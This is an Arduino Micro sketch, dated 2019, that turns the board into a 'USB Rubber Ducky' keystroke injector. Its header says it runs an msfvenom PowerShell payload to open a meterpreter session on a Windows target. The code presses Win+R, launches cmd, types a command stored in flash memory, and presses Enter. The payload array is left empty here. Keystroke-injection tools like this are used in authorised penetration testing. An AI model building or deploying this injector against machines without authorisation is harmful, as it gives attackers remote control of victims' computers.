/*
 *    USB Rubber Ducky with Arduino Micro
 *    
 *    Provided the output of a psh-cmd from msfvenom, this code spawns a meterpreter session in the Windows target machine.
 *    The psh-cmd is stored in the FLASH memory, so the maximum command size is about 28KB in an Arduino Micro.
 *    The whole thing takes about 16 seconds to execute with a command of 7KB.
 *    
 *    Created 17 March 2019
 *    By Mirac L. Gulgonul
 *    
 *    https://mlg556.github.io
 *    
 *    This work is licensed under a Creative Commons Attribution-ShareAlike 3.0 Unported License
 *    https://creativecommons.org/licenses/by-sa/3.0/
 */

#include "Keyboard.h"

const char command[] PROGMEM = {}; // Array pre-allocation on the FLASH memory to store the command.
char chr; // Variable to store the current character of the command.

// The main method, initialises the Keyboard module, opens the Command Prompt and sends the command.
void setup() {
    Keyboard.begin();
    delay(500); // The minimum delay needed.
    cmdOpen();
    typer();
    Keyboard.write(KEY_RETURN);
}

// Does nothing
void loop() {}

// Sends the keystrokes of the psh-command by looping through every character and using Keyboard.write()
void typer() {
    for (int i = 0; i < strlen_P(command); i++) {
        chr = pgm_read_byte_near(command + i);
        Keyboard.write(chr);
    }
}

// Opens the command prompt: hitting Windows+R, typing "cmd" and pressing ENTER.
void cmdOpen() {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(30);
    Keyboard.releaseAll();
    delay(100);
    Keyboard.println("cmd");
    Keyboard.write(KEY_RETURN);
    delay(500);
}
